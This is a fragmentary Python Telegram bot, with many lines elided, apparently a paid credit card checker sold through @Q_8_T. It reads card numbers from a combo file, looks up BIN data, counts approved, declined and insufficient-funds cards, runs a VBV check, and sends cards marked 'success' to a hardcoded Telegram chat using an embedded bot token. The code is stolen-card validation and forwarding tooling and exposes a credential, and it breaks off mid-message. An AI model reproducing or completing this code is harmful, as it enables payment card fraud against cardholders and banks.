...
import threading
stopuser = {}
token = '7240317819:AAEMPPYeRCk_L1bXrAXjs498f8cwVe3aDaM'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Q_8_T")
...
للشراء عن طريق اسياسيل من هنا : @Q_8_T
...
To purchase via USDT from here : @Q_8_T
User Bot : @CHkT1bot {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/Q_8_T")
...
def main(message):
	  ...
	  "timer": "none",
			...
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Q_8_T")
			ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/Q_8_T")
			keyboard.add(contact_button, ahmed)
...
''',reply_markup=keyboard)
		...
		try:
			...
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Q_8_T")
			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/Q_8_T")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
عذرا هذا البوت ليس مجانا 
		...
		try:
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					...
					status = types.InlineKeyboardButton(f"• - sτατυs ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"•  - Αρρяσvєɒ ✔️ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• - CCИ ✅ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• - Ɒєcℓiиєɒ❎ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• τнєτσταℓ  ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ -SΤΣΡ ]", callback_data='stop')
	...
	def my_function():
		...
		try:
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='sτσρρєɒ ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Q_8_T')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					...
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• sτατυs ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"•- Αρρяσvєɒ ✔️ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"•- CCИ ✅ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• Ɒєcℓiиєɒ❎ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"- єℓsĸ ☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"- τσταℓ 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ sτσρ ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
...
def respond_to_vbv(message):
  ...
  "timer": "none",
	...
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@Q_8_T")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/Q_8_T")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
عذرا هذا البوت ليس مجانا 
...
To purchase via USDT from here : @Q_8_T
User Bot : @CHkT1bot {BL}</b><b>مرحبا {name}
عذرا هذا البوت ليس مجانا 
...
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'success' in last:
		tok = '7240317819:AAEMPPYeRCk_L1bXrAXjs498f8cwVe3aDaM'
		acc =  '-889876060'
		mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
